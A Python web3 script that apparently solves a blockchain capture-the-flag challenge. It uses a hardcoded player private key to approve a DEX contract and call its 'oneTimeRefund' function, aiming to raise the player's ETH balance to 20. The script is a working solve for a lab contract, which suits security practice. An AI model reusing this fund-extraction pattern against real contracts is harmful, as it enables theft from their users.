from web3 import Web3
import time

# Configuration
rpc_url = "http://83.136.253.184:49175"
private_key = "0x8e090c87fc3aa674b94342420ad76a3d44b31f0efe24e41d760283b44c4af1e8"
player_address = "0x7d3A17bA26366cEFa5563c3a176f3763782f9098"
dex_address = "0xDF8457c32113036fD17A2E6E06aCd8F4A81884d3"

# Connect to the RPC
w3 = Web3(Web3.HTTPProvider(rpc_url))
if not w3.is_connected():
    raise Exception("Failed to connect to RPC")

# Set up the account
account = w3.eth.account.from_key(private_key)
assert account.address.lower() == player_address.lower(), "Private key mismatch"

# ABI definitions
eld_abi = [
    {
        "constant": False,
        "inputs": [
            {"name": "spender", "type": "address"},
            {"name": "amount", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
]

dex_abi = [
    {
        "constant": True,
        "inputs": [],
        "name": "eldorionFang",
        "outputs": [{"name": "", "type": "address"}],
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "item", "type": "address"},
            {"name": "amount", "type": "uint256"}
        ],
        "name": "oneTimeRefund",
        "outputs": [],
        "type": "function"
    }
]

# Contract instances
dex_contract = w3.eth.contract(address=dex_address, abi=dex_abi)

# Get ELD token address
eld_address = dex_contract.functions.eldorionFang().call()
eld_contract = w3.eth.contract(address=eld_address, abi=eld_abi)

# Amount to refund (41 ELD should yield ~20 Ether after fees)
amount_to_refund = w3.to_wei(41, 'ether')  # 41 ELD in wei units (18 decimals)

# Check player balances
eth_balance = w3.eth.get_balance(player_address)
print(f"Initial player ETH balance: {w3.from_wei(eth_balance, 'ether')} ETH")

# Step 1: Approve DEX to spend 41 ELD
approve_tx = eld_contract.functions.approve(dex_address, amount_to_refund).build_transaction({
    'from': player_address,
    'nonce': w3.eth.get_transaction_count(player_address),
    'gas': 100000,
    'gasPrice': w3.to_wei('50', 'gwei')
})

signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, private_key)
approve_tx_hash = w3.eth.send_raw_transaction(signed_approve_tx.raw_transaction)
print(f"Approval TX hash: {approve_tx_hash.hex()}")

# Wait for transaction to be mined
w3.eth.wait_for_transaction_receipt(approve_tx_hash)
print("Approval completed")

# Step 2: Call oneTimeRefund with 41 ELD
refund_tx = dex_contract.functions.oneTimeRefund(eld_address, amount_to_refund).build_transaction({
    'from': player_address,
    'nonce': w3.eth.get_transaction_count(player_address),
    'gas': 200000,
    'gasPrice': w3.to_wei('50', 'gwei')
})

signed_refund_tx = w3.eth.account.sign_transaction(refund_tx, private_key)
refund_tx_hash = w3.eth.send_raw_transaction(signed_refund_tx.raw_transaction)
print(f"Refund TX hash: {refund_tx_hash.hex()}")

# Wait for transaction to be mined
w3.eth.wait_for_transaction_receipt(refund_tx_hash)
print("Refund completed")

# Check final balance
final_eth_balance = w3.eth.get_balance(player_address)
print(f"Final player ETH balance: {w3.from_wei(final_eth_balance, 'ether')} ETH")

# Verify solution
if final_eth_balance >= w3.to_wei(20, 'ether'):
    print("Challenge solved! Player balance >= 20 ETH")
else:
    print("Challenge not solved. Balance < 20 ETH")
